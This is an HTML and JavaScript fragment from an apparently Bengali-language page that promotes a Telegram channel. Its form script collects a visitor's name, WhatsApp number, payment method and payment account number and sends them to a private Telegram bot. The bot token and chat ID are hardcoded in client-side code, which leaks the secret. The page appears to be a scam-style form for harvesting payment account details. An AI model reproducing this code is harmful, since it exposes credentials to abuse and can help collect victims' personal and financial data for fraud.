    <!-- Telegram Channel Link -->
    <a href="https://t.me/+akAbjsGUC2hmYmVl" class="tg-button" target="_blank">📢 Join Our Telegram Channel</a>

    <script>
        const BOT_TOKEN = "8825109255:AAFyKVGCt4dSp0PD_2qZq8VmmOYg4ri2oks";
        const CHAT_ID = "6048050987";

        document.getElementById('userForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Check if user already submitted
            if(localStorage.getItem('formSubmitted') === 'true') {
                showMessage("আপনি ইতিমধ্যে ফর্মটি পূরণ করেছেন!", "error");
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.innerText = "Submitting...";
            btn.disabled = true;

            const name = document.getElementById('userName').value;
            const waNumber = document.getElementById('waNumber').value;
            const payMethod = document.getElementById('payMethod').value;
            const payNumber = document.getElementById('payNumber').value;
            
            const timeInfo = new Date().toLocaleString('en-GB');

            // Format message for Telegram
            const tgMessage = `📩 *New User Request Received!*\n\n` +
                              `👤 *Name:* ${name}\n` +
                              `📱 *WhatsApp:* ${waNumber}\n` +
                              `💳 *Method:* ${payMethod}\n` +
                              `🏧 *Account Number:* ${payNumber}\n` +
                              `━━━━━━━━━━━━━━\n` +
                              `⏰ *Time:* ${timeInfo}`;

            // Send to Telegram Bot via API
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: tgMessage,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    showMessage("🎉 আপনার রিকোয়েস্ট সফলভাবে জমা হয়েছে! দয়া করে অপেক্ষা করুন।", "success");
                    localStorage.setItem('formSubmitted', 'true'); // Save to local storage
                    document.getElementById('userForm').reset();
                } else {
                    showMessage("দুঃখিত, কোনো সমস্যা হয়েছে। আবার চেষ্টা করুন।", "error");
                }
            })
            .catch(error => {
                showMessage("ইন্টারনেট কানেকশন চেক করুন!", "error");
            })
            .finally(() => {
                btn.innerText = "Payment Submit করুন";
                btn.disabled = false;
            });
        });

        function showMessage(text, type) {
            const msgBox = document.getElementById('message-box');
            msgBox.innerText = text;
            msgBox.className = type;
            msgBox.style.display = 'block';
        }
    </script>
